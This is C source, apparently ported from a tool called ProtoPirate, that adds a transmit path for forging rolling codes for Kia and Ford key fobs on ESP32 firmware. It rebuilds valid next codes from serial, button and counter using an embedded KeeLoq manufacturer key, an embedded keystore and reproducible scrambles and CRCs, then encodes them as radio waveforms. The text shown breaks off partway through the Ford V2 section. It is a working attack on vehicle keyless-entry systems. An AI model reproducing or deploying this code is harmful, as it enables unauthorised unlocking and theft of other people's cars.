static const uint32_t kia_v3v4_enc_te_short = 400U;
static const uint32_t kia_v3v4_enc_te_long = 800U;
static const uint32_t kia_v3v4_enc_sync_duration = 1200U;
static const uint32_t kia_v3v4_enc_end_marker_us = 800U;
static const uint32_t kia_v3v4_enc_preamble_pairs = 12U;
static const uint32_t kia_v3v4_enc_crc_bit_count = 4U;
// Total waveform entries for one burst:
//   preamble(12*2) + sync(2) + data(64*2) + crc(4*2) + end(2) = 164
static const size_t kia_v3v4_enc_cap = 164U;

// AM or FM? source flag carries SubGhzProtocolFlag_FM -> FSK.
static const bool kia_v3v4_enc_is_fsk = true;

// --- Private KeeLoq bit helpers (private copies of bit()/g5() macros) --------
static inline uint32_t kia_v3v4_enc_bit(uint64_t x, uint8_t n) {
    return (uint32_t)((x >> n) & 1ULL);
}
static inline uint32_t kia_v3v4_enc_g5(uint32_t x, int a, int b, int c, int d, int e) {
    return kia_v3v4_enc_bit(x, (uint8_t)a) + kia_v3v4_enc_bit(x, (uint8_t)b) * 2U +
           kia_v3v4_enc_bit(x, (uint8_t)c) * 4U + kia_v3v4_enc_bit(x, (uint8_t)d) * 8U +
           kia_v3v4_enc_bit(x, (uint8_t)e) * 16U;
}

// --- Private KeeLoq Simple-Learning ENCRYPT (private copy of
//     subghz_protocol_keeloq_common_encrypt) --------------------------------
static uint32_t kia_v3v4_enc_keeloq_encrypt(uint32_t data, uint64_t key) {
    uint32_t x = data, r;
    for(r = 0; r < 528; r++) {
        x = (x >> 1) ^
            ((kia_v3v4_enc_bit(x, 0) ^ kia_v3v4_enc_bit(x, 16) ^ kia_v3v4_enc_bit(key, (uint8_t)(r & 63)) ^
              kia_v3v4_enc_bit(kia_v3v4_enc_nlf, (uint8_t)kia_v3v4_enc_g5(x, 1, 9, 20, 26, 31)))
             << 31);
    }
    return x;
}

// --- Build: reconstruct plaintext, KeeLoq-ENCRYPT, produce on-air word -------
//  plaintext = 0xB S CCCC  (btn<<28 | (serial&0x3FF)<<16 | cnt&0xFFFF)
//  on-air word (tx_key) = reverse_key( (serial_btn<<32) | encrypted , 64 )
//  NOTE: defaults to the V4 (version 0) PWM polarity in the uploader.
static bool
    kia_v3v4_enc_build(uint32_t serial, uint8_t btn, uint32_t cnt, uint64_t* out_data, uint16_t* out_bits) {
    const uint32_t plaintext = (uint32_t)(cnt & 0xFFFFU) |
                               ((uint32_t)(serial & 0x3FFU) << 16) |
                               ((uint32_t)(btn & 0x0FU) << 28);
    const uint32_t encrypted = kia_v3v4_enc_keeloq_encrypt(plaintext, kia_v3v4_enc_mf_key);

    const uint32_t serial_btn = (serial & 0x0FFFFFFFU) | ((uint32_t)(btn & 0x0FU) << 28);
    const uint64_t key = ((uint64_t)serial_btn << 32) | (uint64_t)encrypted;
    const uint64_t tx_key = subghz_protocol_blocks_reverse_key(key, 64);

    if(out_data) *out_data = tx_key;
    if(out_bits) *out_bits = 64U;
    return true;
}

// --- Upload: port of get_upload (V4 polarity), one burst, CRC nibble = 0 -----
//  PWM per bit: bit=1 -> (LOW te_short)(HIGH te_long); bit=0 -> (LOW te_long)(HIGH te_short)
static size_t kia_v3v4_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    const uint32_t te_short = kia_v3v4_enc_te_short;
    const uint32_t te_long = kia_v3v4_enc_te_long;
    size_t idx = 0;

    // Preamble: 12 short pairs (V4 polarity: LOW then HIGH).
    for(uint32_t i = 0; i < kia_v3v4_enc_preamble_pairs; i++) {
        idx = pp_emit(up, idx, cap, false, te_short);
        idx = pp_emit(up, idx, cap, true, te_short);
    }

    // Sync: LOW short, HIGH 1200us.
    idx = pp_emit(up, idx, cap, false, te_short);
    idx = pp_emit(up, idx, cap, true, kia_v3v4_enc_sync_duration);

    // Data: MSB-first PWM.
    for(int i = (int)bits - 1; i >= 0; i--) {
        const bool bit = ((data >> i) & 1ULL) != 0ULL;
        const uint32_t first_us = bit ? te_short : te_long;
        const uint32_t second_us = bit ? te_long : te_short;
        idx = pp_emit(up, idx, cap, false, first_us);
        idx = pp_emit(up, idx, cap, true, second_us);
    }

    // CRC nibble (first burst uses crc_iter = 0 -> 4 zero bits).
    const uint8_t crc = 0U;
    for(int b = (int)kia_v3v4_enc_crc_bit_count - 1; b >= 0; b--) {
        const bool bit = ((crc >> b) & 1U) != 0U;
        const uint32_t first_us = bit ? te_short : te_long;
        const uint32_t second_us = bit ? te_long : te_short;
        idx = pp_emit(up, idx, cap, false, first_us);
        idx = pp_emit(up, idx, cap, true, second_us);
    }

    // End marker: LOW 800us, HIGH 800us.
    idx = pp_emit(up, idx, cap, false, kia_v3v4_enc_end_marker_us);
    idx = pp_emit(up, idx, cap, true, kia_v3v4_enc_end_marker_us);

    return idx;
}

// --- next = build + upload; returns pulse (LevelDuration) count, 0 on fail ---
static size_t
    kia_v3v4_enc_next(uint32_t serial, uint8_t btn, uint32_t cnt, LevelDuration* up, size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!kia_v3v4_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return kia_v3v4_enc_upload(data, bits, up, cap);
}

// ============================================================================
//  Banner: KIA/HYU V5  (prefix: kia_v5_enc_)  --  proprietary mixer, embedded
//  keystore.  Flipper-ARF encoder (GPL, embedded key)
// ============================================================================

// --- Embedded keystore (private copy of kia_v5_keystore_bytes/keystore_bytes) -
static const uint8_t kia_v5_enc_keystore_bytes[] =
    {0x53, 0x54, 0x46, 0x52, 0x4b, 0x45, 0x30, 0x30};

// --- Timing / frame constants (private copies of subghz_protocol_kia_v5_const
//     and the KIA_V5_* #defines) --------------------------------------------
static const uint32_t kia_v5_enc_te_short = 400U;
static const uint32_t kia_v5_enc_te_long = 800U;
static const uint32_t kia_v5_enc_preamble_pairs = 200U;
// Real capacity (fixes the source's latent alloc under-size of 400):
//   preamble(200*2) + sync(4) + data(64*2) + separator(2) + crc(2*2) + end(2) = 540
static const size_t kia_v5_enc_cap = 540U;

// AM or FM? source flag carries SubGhzProtocolFlag_FM -> FSK.
static const bool kia_v5_enc_is_fsk = true;

// --- Private CRC (private copy of kia_v5_calculate_crc) ----------------------
static uint8_t kia_v5_enc_calc_crc(uint64_t data) {
    uint8_t crc = 0;
    for(int i = 63; i >= 0; i--) {
        const uint8_t bit = (uint8_t)((data >> i) & 1U);
        const uint8_t shifted_out = (uint8_t)((crc >> 1U) & 1U);
        crc = (uint8_t)(((crc & 1U) << 1U) | bit);
        if(shifted_out) {
            crc ^= 3U;
        }
    }
    return (uint8_t)(crc & 3U);
}

// --- Private mixer ENCODE (private copy of kia_v5_mixer_encode) --------------
//  Inverse of mixer_decode: regenerates the 32-bit "encrypted" word from
//  (serial, counter, button) using the embedded keystore.
static uint32_t kia_v5_enc_mixer_encode(uint32_t serial, uint16_t counter, uint8_t button) {
    uint8_t state_a = (uint8_t)(((serial >> 8) & 0x0FU) | ((button & 0x0FU) << 4));
    uint8_t state_b = (uint8_t)((counter >> 8) & 0xFFU);
    uint8_t state_c = (uint8_t)(serial & 0xFFU);
    uint8_t state_d = (uint8_t)(counter & 0xFFU);

    int ks_idx = 0;
    for(int round_i = 0; round_i < 18; round_i++) {
        uint8_t r = kia_v5_enc_keystore_bytes[ks_idx] & 0xFFU;
        ks_idx = (ks_idx + 1) & 0x07;

        uint8_t running_d = state_d;
        for(int step = 0; step < 8; step++) {
            uint8_t base;
            if((state_a & 0x80U) == 0) {
                base = (state_a & 0x04U) == 0 ? 0x74U : 0x2EU;
            } else {
                base = (state_a & 0x04U) == 0 ? 0x3AU : 0x5CU;
            }

            if(state_c & 0x10U) {
                base = (uint8_t)(((base >> 4) & 0x0FU) | ((base & 0x0FU) << 4));
            }
            if(state_b & 0x02U) {
                base = (uint8_t)((base & 0x3FU) << 2);
            }

            uint8_t base_final = base;
            if(running_d & 0x02U) {
                base_final = (uint8_t)((base & 0x7FU) << 1);
            }

            const bool carry_b = (state_b & 0x01U) != 0;
            const bool carry_c = (state_c & 0x01U) != 0;
            const bool carry_a = (state_a & 0x01U) != 0;

            uint8_t new_d = (uint8_t)(running_d >> 1);
            if(carry_b) new_d |= 0x80U;

            running_d ^= state_c;

            state_b = (uint8_t)(state_b >> 1);
            if(carry_c) state_b |= 0x80U;

            state_c = (uint8_t)(state_c >> 1);
            if(carry_a) state_c |= 0x80U;

            const uint8_t feedback = (uint8_t)(((running_d ^ r) << 7) ^ base_final);
            state_a = (uint8_t)(state_a >> 1);
            if(feedback & 0x80U) state_a |= 0x80U;

            r = (uint8_t)(r >> 1);
            running_d = new_d;
        }
        state_d = running_d;
    }

    return ((uint32_t)state_a << 24) | ((uint32_t)state_c << 16) | ((uint32_t)state_b << 8) |
           (uint32_t)state_d;
}

// --- Build: mixer-ENCODE (serial,cnt,btn), assemble yek, per-byte bit reverse -
//  yek  = (btn<<60) | (serial<<32) | mixer
//  data = per-byte bit-reversal of yek  (the on-air 64-bit word)
static bool
    kia_v5_enc_build(uint32_t serial, uint8_t btn, uint32_t cnt, uint64_t* out_data, uint16_t* out_bits) {
    const uint32_t s = serial & 0x0FFFFFFFU;
    const uint8_t b = (uint8_t)(btn & 0x0FU);
    const uint32_t mixer = kia_v5_enc_mixer_encode(s, (uint16_t)cnt, b);
    const uint64_t yek = ((uint64_t)b << 60) | ((uint64_t)s << 32) | (uint64_t)mixer;

    uint64_t data = 0;
    for(int i = 0; i < 8; i++) {
        const uint8_t byte = (uint8_t)((yek >> (i * 8)) & 0xFFU);
        data |= ((uint64_t)pp_reverse_bits8(byte) << ((7 - i) * 8));
    }

    if(out_data) *out_data = data;
    if(out_bits) *out_bits = 64U;
    return true;
}

// --- Upload: port of get_upload (Manchester-style pairs) ---------------------
//  bit=1 -> (LOW te_short)(HIGH te_short); bit=0 -> (HIGH te_short)(LOW te_short)
//  CRC (2 bits) is derived from the on-air data via the private CRC copy.
static size_t kia_v5_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    const uint32_t te_short = kia_v5_enc_te_short;
    const uint32_t te_long = kia_v5_enc_te_long;
    size_t idx = 0;

    const uint8_t crc = kia_v5_enc_calc_crc(data);

    // Preamble: 200 short pairs (HIGH then LOW).
    for(uint32_t i = 0; i < kia_v5_enc_preamble_pairs; i++) {
        idx = pp_emit(up, idx, cap, true, te_short);
        idx = pp_emit(up, idx, cap, false, te_short);
    }

    // Sync: LOW short, HIGH long, LOW short, HIGH short.
    idx = pp_emit(up, idx, cap, false, te_short);
    idx = pp_emit(up, idx, cap, true, te_long);
    idx = pp_emit(up, idx, cap, false, te_short);
    idx = pp_emit(up, idx, cap, true, te_short);

    // Data bits, MSB-first.
    for(int i = (int)bits - 1; i >= 0; i--) {
        const bool bv = ((data >> i) & 1ULL) != 0ULL;
        if(bv) {
            idx = pp_emit(up, idx, cap, false, te_short);
            idx = pp_emit(up, idx, cap, true, te_short);
        } else {
            idx = pp_emit(up, idx, cap, true, te_short);
            idx = pp_emit(up, idx, cap, false, te_short);
        }
    }

    // Separator pair (HIGH then LOW).
    idx = pp_emit(up, idx, cap, true, te_short);
    idx = pp_emit(up, idx, cap, false, te_short);

    // CRC bit 1 then CRC bit 0.
    const bool crc_b1 = ((crc >> 1U) & 1U) != 0U;
    if(crc_b1) {
        idx = pp_emit(up, idx, cap, false, te_short);
        idx = pp_emit(up, idx, cap, true, te_short);
    } else {
        idx = pp_emit(up, idx, cap, true, te_short);
        idx = pp_emit(up, idx, cap, false, te_short);
    }

    const bool crc_b0 = (crc & 1U) != 0U;
    if(crc_b0) {
        idx = pp_emit(up, idx, cap, false, te_short);
        idx = pp_emit(up, idx, cap, true, te_short);
    } else {
        idx = pp_emit(up, idx, cap, true, te_short);
        idx = pp_emit(up, idx, cap, false, te_short);
    }

    // End: LOW short, HIGH short.
    idx = pp_emit(up, idx, cap, false, te_short);
    idx = pp_emit(up, idx, cap, true, te_short);

    return idx;
}

// --- next = build + upload; returns pulse (LevelDuration) count, 0 on fail ---
static size_t
    kia_v5_enc_next(uint32_t serial, uint8_t btn, uint32_t cnt, LevelDuration* up, size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!kia_v5_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return kia_v5_enc_upload(data, bits, up, cap);
}

// ============================================================================
//  SUMMARY
//  --------
//  Protocol   next() entry point     is_fsk   cap (LevelDuration entries)
//  KIA V3/V4  kia_v3v4_enc_next      true     164  (kia_v3v4_enc_cap)
//  KIA V5     kia_v5_enc_next        true     540  (kia_v5_enc_cap)
//
//  KIA V3/V4: KeeLoq Simple-Learning. plaintext = btn<<28 | (serial&0x3FF)<<16
//    | cnt&0xFFFF, encrypted with the embedded MF key, on-air word is the
//    reverse_key of (serial_btn<<32 | encrypted). PWM waveform (AM/FM=FSK),
//    V4 polarity, CRC nibble = 0 (first burst; source sweeps 0..15 over 16
//    repeats via yield/patch_crc — a single next() emits burst 0).
//
//  KIA V5: proprietary mixer_encode over the embedded keystore. yek =
//    btn<<60 | serial<<32 | mixer(serial,cnt,btn); on-air data is the per-byte
//    bit-reversal of yek. Manchester-style pairs, 2-bit CRC derived from data.
//    cap raised to the real 540 (source alloc'd only 400 -> latent overflow).
//
//  COLLISION-SAFETY: every emitted symbol is <p>_enc_-prefixed. NO bare
//  KIA_MF_KEY, KEELOQ_NLF, keystore_bytes, subghz_protocol_keeloq_common_*,
//  mixer_decode/encode, or <p>_const names are defined or referenced. Private
//  copies used: kia_v3v4_enc_mf_key, kia_v3v4_enc_nlf, kia_v3v4_enc_keeloq_encrypt,
//  kia_v5_enc_keystore_bytes, kia_v5_enc_mixer_encode, kia_v5_enc_calc_crc, and
//  all kia_*_enc_te_* / cap / is_fsk statics. Only firmware-provided shim
//  symbols (pp_emit, level_duration_make, subghz_protocol_blocks_reverse_key,
//  pp_reverse_bits8, LevelDuration) are referenced, never redefined.
// ============================================================================


// --- pp_enc_kia0ford.h ---
/* =========================================================================
 * pp_enc_kia0ford.h
 * ProtoPirate encoder (GPLv3)
 *
 * Self-contained ENCODE / next-rolling-code path for three ProtoPirate
 * car-key protocols, ported for an ESP32 firmware. Decode side already
 * exists; this fragment only adds the transmit path.
 *
 * Ported from ProtoPirate (GPLv3):
 *   protocols/kia_v0.c, protocols/ford_v1.c, protocols/ford_v2.c
 *
 * Relies on the firmware-provided encoder shim (level_duration_make, pp_emit,
 * pp_emit_merge, subghz_protocol_blocks_crc8/crc16/parity8, ...). Those are
 * used here, never redefined. Every static below is prefixed <p>_enc_ so it
 * cannot collide with the decode-side constants / helpers.
 *
 * No #include / no #pragma once on purpose: include this inside a TU that
 * already pulled in the shim and <stdint.h>/<stdbool.h>.
 * ========================================================================= */

/* =========================================================================
 * ============================  KIA V0  ===================================
 * ProtoPirate encoder (GPLv3)  --  protocols/kia_v0.c
 *
 * Rolling code with a plaintext counter and a CRC8 (poly 0x7F). No secret
 * key: the "next code" is just serial/btn/(cnt+1) re-CRC'd, so a full frame
 * is reconstructable. This port emits the base "KIA" sub-type (61-bit); the
 * source multiplexes Kia/Suzuki/Honda/Mitsu on a runtime `type` that is not
 * available from serial/btn/cnt alone.
 * FSK (SubGhzProtocolFlag_FM).
 * ========================================================================= */

static const uint32_t kia_v0_enc_te_short = 250U;
static const uint32_t kia_v0_enc_te_long = 500U;
static const uint32_t kia_v0_enc_type1_sync = 750U;
static const uint32_t kia_v0_enc_kia_gap = 1000U;
static const uint16_t kia_v0_enc_type1_preamble_pairs = 0x13FU;
static const uint16_t kia_v0_enc_tail_preamble_pairs = 0x0FU;
static const uint16_t kia_v0_enc_bit_count_kia = 61U;
/* KIA_V0_UPLOAD_CAPACITY from the source (max over all sub-types). */
static const size_t kia_v0_enc_upload_cap = 1065U;
static const bool kia_v0_enc_is_fsk = true;

/* CRC8 poly 0x7F over data bytes [48..8] (skip top byte and the CRC byte). */
static uint8_t kia_v0_enc_calc_crc(uint64_t data) {
    uint8_t crc_data[6];
    crc_data[0] = (uint8_t)((data >> 48) & 0xFFU);
    crc_data[1] = (uint8_t)((data >> 40) & 0xFFU);
    crc_data[2] = (uint8_t)((data >> 32) & 0xFFU);
    crc_data[3] = (uint8_t)((data >> 24) & 0xFFU);
    crc_data[4] = (uint8_t)((data >> 16) & 0xFFU);
    crc_data[5] = (uint8_t)((data >> 8) & 0xFFU);
    return subghz_protocol_blocks_crc8(crc_data, 6, 0x7F, 0x00);
}

static uint64_t
    kia_v0_enc_build_kia_raw(uint32_t serial, uint8_t button, uint16_t counter, uint8_t crc) {
    const uint32_t high = 0x0F000000UL | (((uint32_t)counter & 0xFFFFUL) << 8U) |
                          ((serial >> 20U) & 0xFFUL);
    const uint32_t low = (((uint32_t)serial & 0x000FFFFFUL) << 12U) |
                         (((uint32_t)button & 0x0FUL) << 8U) | crc;
    return ((uint64_t)high << 32U) | low;
}

/* Rebuild the 61-bit KIA frame word from serial/btn/cnt (cnt pre-incremented
 * by the caller) and recompute the CRC8. */
static bool kia_v0_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    const uint16_t counter = (uint16_t)(cnt & 0xFFFFU);
    const uint8_t button = (uint8_t)(btn & 0x0FU);

    uint64_t partial = kia_v0_enc_build_kia_raw(serial, button, counter, 0U);
    uint8_t crc = kia_v0_enc_calc_crc(partial);

    *out_data = kia_v0_enc_build_kia_raw(serial, button, counter, crc);
    *out_bits = kia_v0_enc_bit_count_kia;
    return true;
}

/* Manchester-style data pairs: long/long for a 1, short/short for a 0. */
static size_t kia_v0_enc_append_data_pairs(
    LevelDuration* up,
    size_t i,
    size_t cap,
    uint64_t data,
    uint8_t bit_count) {
    for(int bit = (int)bit_count - 1; bit >= 0; bit--) {
        const uint32_t duration =
            ((data >> bit) & 1ULL) ? kia_v0_enc_te_long : kia_v0_enc_te_short;
        i = pp_emit(up, i, cap, true, duration);
        i = pp_emit(up, i, cap, false, duration);
    }
    return i;
}

/* Port of kia_v0_build_kia_upload operating on the passed data word. */
static size_t kia_v0_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;
    size_t i = 0;

    i = pp_emit(up, i, cap, true, kia_v0_enc_type1_sync);
    i = pp_emit(up, i, cap, false, kia_v0_enc_type1_sync);
    i = pp_emit_short_pairs(up, i, cap, kia_v0_enc_te_short, kia_v0_enc_type1_preamble_pairs);
    i = kia_v0_enc_append_data_pairs(up, i, cap, data, (uint8_t)kia_v0_enc_bit_count_kia);
    i = pp_emit(up, i, cap, true, 1500U);
    i = pp_emit(up, i, cap, false, 1500U);
    i = pp_emit_short_pairs(up, i, cap, kia_v0_enc_te_short, kia_v0_enc_tail_preamble_pairs);
    i = kia_v0_enc_append_data_pairs(up, i, cap, data, (uint8_t)kia_v0_enc_bit_count_kia);
    i = pp_emit(up, i, cap, true, kia_v0_enc_kia_gap);

    return i;
}

static size_t
    kia_v0_enc_next(uint32_t serial, uint8_t btn, uint32_t cnt, LevelDuration* up, size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!kia_v0_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return kia_v0_enc_upload(data, bits, up, cap);
}

/* =========================================================================
 * ============================  FORD V1  ==================================
 * ProtoPirate encoder (GPLv3)  --  protocols/ford_v1.c
 *
 * 136-bit Manchester frame: 17 bytes = 7-byte Key1 | 8-byte Key2 (9-byte
 * scrambled "air" block) | CRC16 (poly 0x1021). The scramble/descramble
 * (ford_v1_*_block) is fully reproducible, so no secret key is required.
 * The 136-bit frame does NOT fit a uint64; the full frame is carried in a
 * file-static buffer between build() and upload(); out_data holds the
 * leading 8 bytes for reference only.
 *
 * The source encoder *modifies a captured* 9-byte plaintext block. Rebuilding
 * from serial/btn/cnt alone means synthesising that block: plain9[4] is forced
 * to (serial & 0xFF) because the decode side's "strict" descramble path
 * requires plain9[4] == air9[0] == serial LSB for a clean (fields-recovered)
 * decode. A genuine key fob may use plain9[4] as cipher material -- treat this
 * as a rolling-code reconstruction, verify against a real capture.
 * FSK (SubGhzProtocolFlag_FM).
 * ========================================================================= */

static const uint32_t ford_v1_enc_short_us = 65U;
static const uint32_t ford_v1_enc_long_us = 130U;
static const uint32_t ford_v1_enc_gap_repeat_us = 50000U;
static const uint32_t ford_v1_enc_gap_last_us = 260U;
static const uint16_t ford_v1_enc_preamble_pairs = 400U;
static const uint8_t ford_v1_enc_burst_count = 6U;
static const uint8_t ford_v1_enc_data_bytes = 17U;
/* FORD_V1_ENC_BURST_LD_COUNT = (400*2)+2+(17*16)+1 = 1075 = 0x433 */
static const size_t ford_v1_enc_upload_cap = 0x433U;
static const bool ford_v1_enc_is_fsk = true;

/* Per-burst override of pkt[4]; the source only ever transmits burst 0. */
static const uint8_t ford_v1_enc_burst_pkt4_vals[6] = {0x08, 0x00, 0x10, 0x08, 0x00, 0x10};

/* Full 17-byte frame, handed from build() to upload(). */
static uint8_t ford_v1_enc_frame[17];

static uint16_t ford_v1_enc_crc16(const uint8_t* d, size_t n) {
    return subghz_protocol_blocks_crc16(d, n, 0x1021, 0x0000);
}

/* Port of ford_v1_encode_inverse_block (plaintext -> scrambled air). */
static void ford_v1_enc_inverse_block(uint8_t block[9]) {
    uint8_t sum = 0;
    for(size_t i = 1; i <= 7; i++) {
        sum = (uint8_t)(sum + block[i]);
    }

    const uint8_t p6 = block[6];
    const uint8_t p7 = block[7];
    const uint8_t post6 = (uint8_t)((p6 & 0xAAU) | (p7 & 0x55U));
    const uint8_t post7 = (uint8_t)((p7 & 0xAAU) | (p6 & 0x55U));
    const uint8_t xorv = (uint8_t)(post6 ^ post7);

    uint8_t xor_byte;
    if((subghz_protocol_blocks_parity8(sum) & 1U) != 0U) {
        block[6] = xorv;
        block[7] = post7;
        xor_byte = post7;
    } else {
        block[6] = post6;
        block[7] = xorv;
        xor_byte = post6;
    }

    for(size_t i = 1; i <= 5; i++) {
        block[i] ^= xor_byte;
    }
}

static void ford_v1_enc_air_9bytes(const uint8_t* plain9, uint8_t* air9_out) {
    uint8_t block[9];
    for(size_t i = 0; i < 9; i++) block[i] = plain9[i];
    ford_v1_enc_inverse_block(block);
    for(size_t i = 0; i < 9; i++) air9_out[i] = block[i];
}

/* Reconstruct the full 17-byte frame from serial/btn/cnt (cnt pre-incremented
 * by the caller). Returns the leading 8 bytes in out_data. */
static bool ford_v1_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    uint8_t plain9[9];
    for(size_t i = 0; i < 9; i++) plain9[i] = 0;

    plain9[0] = (uint8_t)(serial & 0xFFU);
    plain9[1] = (uint8_t)((serial >> 24) & 0xFFU);
    plain9[2] = (uint8_t)((serial >> 16) & 0xFFU);
    plain9[3] = (uint8_t)((serial >> 8) & 0xFFU);
    /* Decode-side strict path requires plain9[4] == air9[0] == serial LSB. */
    plain9[4] = (uint8_t)(serial & 0xFFU);
    plain9[5] = (uint8_t)(((btn & 0x0FU) << 4) | ((cnt >> 16) & 0x0FU));
    plain9[6] = (uint8_t)((cnt >> 8) & 0xFFU);
    plain9[7] = (uint8_t)(cnt & 0xFFU);
    plain9[8] = (uint8_t)(plain9[5] + plain9[6] + plain9[7]);

    uint8_t raw[17];
    for(size_t i = 0; i < 17; i++) raw[i] = 0;
    /* Key1 bytes that must equal the cleartext serial for the strict decode
     * (raw[3..6] = serial), also feed the CRC16 window raw[3..14]. */
    raw[3] = (uint8_t)((serial >> 24) & 0xFFU);
    raw[4] = (uint8_t)((serial >> 16) & 0xFFU);
    raw[5] = (uint8_t)((serial >> 8) & 0xFFU);

    uint8_t air9[9];
    ford_v1_enc_air_9bytes(plain9, air9);
    for(size_t i = 0; i < 9; i++) raw[6 + i] = air9[i]; /* raw[6] == serial LSB */

    uint16_t c = ford_v1_enc_crc16(&raw[3], 12);
    raw[15] = (uint8_t)((c >> 8) & 0xFFU);
    raw[16] = (uint8_t)(c & 0xFFU);

    for(size_t i = 0; i < 17; i++) ford_v1_enc_frame[i] = raw[i];

    uint64_t d = 0;
    for(int i = 0; i < 8; i++) d = (d << 8) | (uint64_t)raw[i];
    *out_data = d;
    *out_bits = 136U;
    return true;
}

/* Port of ford_v1_encoder_build_burst (burst 0, the only burst the source
 * actually transmits). Reads the frame from the file-static buffer. */
static size_t ford_v1_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)data;
    (void)bits;

    uint8_t pkt[17];
    for(size_t i = 0; i < 17; i++) pkt[i] = ford_v1_enc_frame[i];

    const uint8_t burst_idx = 0U;
    pkt[4] = ford_v1_enc_burst_pkt4_vals[burst_idx];
    uint16_t c = ford_v1_enc_crc16(&pkt[3], 12);
    pkt[15] = (uint8_t)((c >> 8) & 0xFFU);
    pkt[16] = (uint8_t)(c & 0xFFU);

    size_t i = 0;
    for(size_t p = 0; p < ford_v1_enc_preamble_pairs; p++) {
        i = pp_emit(up, i, cap, true, ford_v1_enc_long_us);
        i = pp_emit(up, i, cap, false, ford_v1_enc_long_us);
    }
    i = pp_emit(up, i, cap, true, ford_v1_enc_long_us);
    i = pp_emit(up, i, cap, false, ford_v1_enc_short_us);

    for(size_t by = 0; by < ford_v1_enc_data_bytes; by++) {
        uint8_t b = pkt[by];
        for(int bit_i = 7; bit_i >= 0; bit_i--) {
            bool bit = ((b >> bit_i) & 1U) != 0U;
            i = pp_emit(up, i, cap, bit, ford_v1_enc_short_us);
            i = pp_emit(up, i, cap, !bit, ford_v1_enc_short_us);
        }
    }

    i = pp_emit(
        up,
        i,
        cap,
        false,
        (burst_idx + 1U == ford_v1_enc_burst_count) ? ford_v1_enc_gap_last_us :
                                                       ford_v1_enc_gap_repeat_us);
    return i;
}

static size_t
    ford_v1_enc_next(uint32_t serial, uint8_t btn, uint32_t cnt, LevelDuration* up, size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!ford_v1_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return ford_v1_enc_upload(data, bits, up, cap);
}

/* =========================================================================
 * ============================  FORD V2  ==================================
 * ProtoPirate encoder (GPLv3)  --  protocols/ford_v2.c
 *
 * 104-bit Manchester frame: 13 bytes = 0x7F 0xA7 sync | 4-byte serial |
 * button | 16-bit plaintext counter | 31-bit tail. NO CRC / no cipher: the
 * decode side only validates the sync bytes, a known-button whitelist and
 * the internal counter-bit packing, so a full "next code" is reconstructable
 * (tail31 is left 0). The 104-bit frame does not fit a uint64; the 13-byte
 * frame is carried in a file-static buffer between build() and upload();
 * out_data holds the leading 8 bytes for reference only.
 * FSK (SubGhzProtocolFlag_FM).
 * ========================================================================= */

static const uint32_t ford_v2_enc_te_short = 240U;
static const uint32_t ford_v2_enc_sync_lo_us = 476U;
static const uint32_t ford_v2_enc_inter_burst_gap_us = 16000U;
static const uint16_t ford_v2_enc_preamble_pairs = 70U;
static const uint8_t ford_v2_enc_burst_count = 6U;
static const uint16_t ford_v2_enc_data_bits = 104U;
static const uint8_t ford_v2_enc_data_bytes = 13U;
static const uint8_t ford_v2_enc_sync0 = 0x7FU;
static const uint8_t ford_v2_enc_sync1 = 0xA7U;
/* FORD_V2_ENC_UPLOAD_ELEMS = 6*((70*2)+2+((104-1)*2)) + (6-1) = 6*348 + 5 = 2093
 * (pre-merge upper bound; adjacent same-level pairs are merged so the real
 * emitted count is a few fewer). */
static const size_t ford_v2_enc_upload_cap = 2093U;
static const bool ford_v2_enc_is_fsk = true;

static bool ford_v2_enc_button_is_valid(uint8_t btn) {
    switch(btn) {
    case 0x10:
    case 0x11:
    case 0x13:
    case 0x14:
    case 0x15:
        return true;
    default:
        return false;
    }
}

/* Full 13-byte frame, handed from build() to upload(). */
static uint8_t ford_v2_enc_frame[13];

/* Reconstruct the 13-byte frame from serial/btn/cnt (cnt pre-incremented by
 * the caller). Returns false on an out-of-whitelist button. */
static bool ford_v2_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    if(!ford_v2_enc_button_is_valid(btn)) return false;

    uint8_t k[13];
    for(size_t i = 0; i < 13; i++) k[i] = 0;

    k[0] = ford_v2_enc_sync0;
    k[1] = ford_v2_enc_sync1;
    k[2] = (uint8_t)((serial >> 24) & 0xFFU);
    k[3] = (uint8_t)((serial >> 16) & 0xFFU);
    k[4] = (uint8_t)((serial >> 8) & 0xFFU);
    k[5] = (uint8_t)(serial & 0xFFU);
    k[6] = btn;

    const uint16_t c = (uint16_t)(cnt & 0xFFFFU);
    k[7] = (uint8_t)((c >> 9) & 0x7FU);
    k[8] = (uint8_t)((c >> 1) & 0xFFU);
    k[9] = (uint8_t)((c & 1U) << 7);
    /* tail31 == 0 -> k[9] low 7 bits and k[10..12] stay 0. */

    /* k[7] MSB = parity(button), matching ford_v2_encoder_rebuild_raw. */
    k[7] = (uint8_t)((k[7] & 0x7FU) | (subghz_protocol_blocks_parity8(btn) << 7));

    for(size_t i = 0; i < 13; i++) ford_v2_enc_frame[i] = k[i];

    uint64_t d = 0;
    for(int i = 0; i < 8; i++) d = (d << 8) | (uint64_t)k[i];
    *out_data = d;
    *out_bits = ford_v2_enc_data_bits;
    return true;
}

/* Manchester bit: 1 -> (hi,lo), 0 -> (lo,hi); merged with any preceding run. */
static size_t ford_v2_enc_emit_bit(LevelDuration* up, size_t i, size_t cap, bool bit) {
    if(bit) {
        i = pp_emit_merge(up, i, cap, true, ford_v2_enc_te_short);
        i = pp_emit_merge(up, i, cap, false, ford_v2_enc_te_short);
    } else {
        i = pp_emit_merge(up, i, cap, false, ford_v2_enc_te_short);
        i = pp_emit_merge(up, i, cap, true, ford_v2_enc_te_short);
    }
    return i;
}

